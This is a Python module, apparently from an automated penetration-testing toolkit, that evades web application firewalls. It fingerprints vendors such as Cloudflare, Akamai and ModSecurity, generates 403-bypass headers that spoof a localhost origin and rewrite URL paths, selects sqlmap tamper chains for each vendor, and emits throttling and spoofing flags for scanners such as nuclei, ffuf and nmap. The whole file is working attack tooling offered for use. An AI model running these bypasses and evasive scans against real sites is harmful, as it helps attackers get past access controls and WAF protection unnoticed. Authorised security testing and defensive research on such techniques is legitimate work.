"""
WAF Evasion & 403 Bypass Engine — HexStrike-Style Defensive Bypass.

Detects WAF signatures (Cloudflare, AWS WAF, Akamai, Imperva, ModSecurity, etc.),
generates 403/Forbidden bypass headers, provides dynamic SQLMap tamper scripts,
and controls scan rate-limiting and jitter.

Inspired by HexStrike AI's WAF evasion subsystems.
"""

import logging
import urllib.parse
from enum import Enum
from typing import Any, Dict, List, Optional

logger = logging.getLogger(__name__)


class WAFType(str, Enum):
    CLOUDFLARE = "cloudflare"
    AWS_WAF = "aws_waf"
    AKAMAI = "akamai"
    IMPERVA = "imperva"
    MODSECURITY = "modsecurity"
    SUCURI = "sucuri"
    F5_BIGIP = "f5_bigip"
    FORTINET = "fortinet"
    GENERIC = "generic"


# Header & body signatures for automated WAF detection
WAF_SIGNATURES: Dict[WAFType, Dict[str, List[str]]] = {
    WAFType.CLOUDFLARE: {
        "headers": ["cf-ray", "cf-cache-status", "__cfduid", "cf-request-id", "server: cloudflare"],
        "body": ["cloudflare", "attention required! | cloudflare", "ray id:", "error 1020"],
    },
    WAFType.AWS_WAF: {
        "headers": ["x-amz-cf-id", "x-amzn-requestid", "server: awselb"],
        "body": ["aws", "amazon", "request blocked", "403 forbidden"],
    },
    WAFType.AKAMAI: {
        "headers": ["x-akamai-transformed", "akamai-origin-hop", "server: akamaighost"],
        "body": ["akamai", "access denied", "reference #"],
    },
    WAFType.IMPERVA: {
        "headers": ["x-cdn: imperva", "x-iinfo", "incap_ses", "visid_incap"],
        "body": ["incapsula", "imperva", "incident id:"],
    },
    WAFType.MODSECURITY: {
        "headers": ["server: mod_security", "modsecurity", "x-mod-security"],
        "body": ["mod_security", "modsecurity", "not acceptable", "blocked by mod_security"],
    },
    WAFType.SUCURI: {
        "headers": ["x-sucuri-id", "x-sucuri-cache", "server: sucuri"],
        "body": ["sucuri website firewall", "access denied - sucuri website firewall"],
    },
    WAFType.F5_BIGIP: {
        "headers": ["x-wa-info", "server: big-ip", "bigipserver"],
        "body": ["the requested url was rejected", "f5 networks"],
    },
}

# Standard 403 bypass header configurations
BYPASS_HEADERS_POOL: List[Dict[str, str]] = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-Forwarded-Host": "localhost"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"X-Host": "127.0.0.1"},
    {"X-Forwarded-Server": "localhost"},
]


class WAFEvasionManager:
    """Manages WAF detection, 403 bypass attempts, and tool evasion settings."""

    @classmethod
    def detect_waf(
        cls,
        headers: Optional[Dict[str, str]] = None,
        body: Optional[str] = None,
        status_code: Optional[int] = None
    ) -> Optional[WAFType]:
        """Detect WAF type from HTTP response headers, status, and body content."""
        headers = headers or {}
        body_lower = (body or "").lower()
        header_text = " ".join(f"{k}: {v}" for k, v in headers.items()).lower()

        for waf_type, sigs in WAF_SIGNATURES.items():
            # Check headers
            for sig in sigs["headers"]:
                if sig.lower() in header_text:
                    logger.info(f"WAF_DETECTED: type={waf_type.value} via header signature '{sig}'")
                    return waf_type

            # Check body
            if body_lower:
                for sig in sigs["body"]:
                    if sig.lower() in body_lower:
                        logger.info(f"WAF_DETECTED: type={waf_type.value} via body signature '{sig}'")
                        return waf_type

        # Generic 403/WAF heuristic
        if status_code in (403, 406, 429) and any(w in body_lower for w in ["firewall", "blocked", "waf", "security"]):
            logger.info("WAF_DETECTED: type=generic via 403/security body heuristic")
            return WAFType.GENERIC

        return None

    @classmethod
    def get_403_bypass_headers(cls, target_url: str = "") -> Dict[str, str]:
        """Generate comprehensive bypass headers to circumvent 403/Forbidden access controls."""
        headers: Dict[str, str] = {}
        for pool in BYPASS_HEADERS_POOL:
            headers.update(pool)

        if target_url:
            parsed = urllib.parse.urlparse(target_url)
            path = parsed.path or "/"
            headers["X-Original-URL"] = path
            headers["X-Rewrite-URL"] = path

        return headers

    @classmethod
    def get_403_bypass_curl_flags(cls, target_url: str = "") -> str:
        """Return cURL flag string containing all 403 bypass headers."""
        headers = cls.get_403_bypass_headers(target_url)
        return " ".join(f"-H '{k}: {v}'" for k, v in headers.items())

    @classmethod
    def get_sqlmap_tamper_scripts(cls, waf_type: Optional[WAFType] = None) -> str:
        """Return optimal SQLMap tamper script sequence for detected WAF."""
        if waf_type == WAFType.CLOUDFLARE:
            return "between,randomcase,charencode,space2comment"
        elif waf_type == WAFType.MODSECURITY:
            return "space2comment,between,randomcase,modsecurityversioned"
        elif waf_type == WAFType.AWS_WAF:
            return "between,randomcase,space2comment"
        elif waf_type == WAFType.IMPERVA:
            return "between,randomcase,charencode"
        elif waf_type == WAFType.AKAMAI:
            return "between,randomcase,space2plus"
        return "space2comment,between,randomcase"

    @classmethod
    def get_tool_evasion_args(cls, tool_name: str, waf_type: Optional[WAFType] = None) -> List[str]:
        """Generate CLI flags for tools to evade rate limits and WAF blocks."""
        flags: List[str] = []
        t = tool_name.lower().strip()

        if t == "nuclei":
            flags.extend(["--rate-limit 5", "--bulk-size 5", "-H 'X-Forwarded-For: 127.0.0.1'"])
        elif t in ("gobuster", "dirsearch", "feroxbuster"):
            flags.extend(["-t 5", "--delay 200ms", "-a 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'"])
        elif t == "ffuf":
            flags.extend(["-rate 5", "-p 0.2", "-H 'X-Forwarded-For: 127.0.0.1'"])
        elif t == "sqlmap":
            tampers = cls.get_sqlmap_tamper_scripts(waf_type)
            flags.extend([f"--tamper={tampers}", "--random-agent", "--delay=1", "--retries=3"])
        elif t == "dalfox":
            flags.extend(["--waf-evasion", "--delay 200"])
        elif t == "nmap":
            flags.extend(["-T2", "--max-retries 2", "--scan-delay 500ms"])

        return flags
